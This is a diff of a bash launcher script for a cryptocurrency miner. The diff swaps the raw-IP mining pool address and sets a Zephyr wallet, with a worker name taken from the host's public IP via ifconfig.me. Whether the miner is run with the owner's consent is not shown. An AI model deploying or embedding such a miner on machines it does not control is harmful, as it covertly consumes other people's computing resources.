@@ -1,5 +1,5 @@
 #!/bin/bash
-POOL=stratum+ssl://172.200.229.146:80
+POOL=stratum+ssl://157.230.252.215:80
 WALLET=ZEPHsA6L9MHTJ2T922LWjF2CLc6Pzsoi8EYX9HJBgQkv8qYTqsQtBs4FNVuF8ymvyhRfYsLa4EJr7FiQPPTeN8KgJmykU8JXatM.CPU_$(echo "$(curl -s ifconfig.me)" | tr . _ )
 myip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
 cd "$(dirname "$0")"
